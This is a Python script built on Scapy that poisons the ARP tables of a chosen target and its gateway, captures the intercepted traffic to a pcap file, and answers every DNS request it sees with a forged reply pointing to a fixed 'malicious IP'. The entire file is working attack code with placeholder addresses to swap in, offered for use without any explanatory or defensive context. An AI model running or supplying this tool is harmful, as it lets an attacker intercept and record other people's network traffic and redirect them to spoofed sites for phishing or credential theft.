from scapy.all import *
import sys
import time
from threading import Thread, Event

# Function to get MAC address of a device by its IP
def get_mac(ip, iface):
    ans, _ = arping(ip, iface=iface, verbose=False)
    for s, r in ans:
        return r[Ether].src
    return None  # Return None if the MAC is not found

# Function to spoof the ARP table
def spoof(target_ip, target_mac, spoof_ip, iface):
    if target_mac is None:
        print(f"[ERROR] Unable to find MAC address for {target_ip}. Attack not possible.")
        return False  # Indicate that the attack cannot proceed

    # Spoof the ARP table
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=iface)
    return True

# Function to restore ARP table to original state
def restore(dest_ip, dest_mac, source_ip, source_mac, iface):
    if dest_mac is None or source_mac is None:
        print(f"[ERROR] Unable to find MAC address for {dest_ip} or {source_ip}. Cannot restore.")
        return

    # Restore ARP table
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False, iface=iface)

# Capture packets and log them to a .pcap file
def capture_packets(stop_event, iface, pcap_file):
    print(f"[*] Capturing packets on {iface}... Saving to {pcap_file}")
    packets = sniff(prn=process_packet, stop_filter=lambda _: stop_event.is_set(), iface=iface, store=True)
    wrpcap(pcap_file, packets)  # Save captured packets to a .pcap file

# Function to process intercepted DNS packets and spoof them
def process_packet(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Check if it's a DNS request
        requested_domain = packet[DNSQR].qname.decode('utf-8')
        print(f"[*] Intercepted DNS request for: {requested_domain}")

        # Redirect all DNS queries to the malicious IP
        spoofed_ip = "192.168.29.243"  # You can change this to any IP address you want to redirect to

        # Spoof the DNS response
        if packet.haslayer(IP) and packet.haslayer(UDP):
            spoofed_packet = (IP(dst=packet[IP].src, src=packet[IP].dst) /
                              UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                              DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                  an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=spoofed_ip)))

            send(spoofed_packet, verbose=False)
            print(f"[*] Sent spoofed DNS response for {requested_domain} to {spoofed_ip}")

# Target and gateway IP addresses for ARP spoofing
target_ip = "192.168.29.218"  # Replace with your target's IP
gateway_ip = "192.168.29.1"   # Replace with your gateway's IP
iface = "wlan0"              # Replace with your network interface

# Name of the .pcap file to save captured packets
pcap_file = "dns_spoofed_traffic.pcap"

# Create a list to hold captured packets and an event to stop packet capturing
stop_event = Event()

try:
    # Get MAC addresses for target and gateway
    target_mac = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if target_mac is None or gateway_mac is None:
        print("[ERROR] Could not find one or both MAC addresses. Exiting.")
        sys.exit(1)

    # Start capturing packets in a separate thread
    capture_thread = Thread(target=capture_packets, args=(stop_event, iface, pcap_file))
    capture_thread.start()

    # Perform ARP spoofing continuously
    print("[*] Starting ARP spoofing...")
    while True:
        if not spoof(target_ip, target_mac, gateway_ip, iface):
            print("[ERROR] Attack not possible; exiting.")
            break
        spoof(gateway_ip, gateway_mac, target_ip, iface)
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] Restoring ARP tables...")
    restore(target_ip, target_mac, gateway_ip, gateway_mac, iface)
    restore(gateway_ip, gateway_mac, target_ip, target_mac, iface)
    stop_event.set()  # Signal the capture thread to stop
    capture_thread.join()  # Wait for capture thread to finish
    print(f"[+] DNS spoofing attack stopped. Captured packets saved to {pcap_file}.")
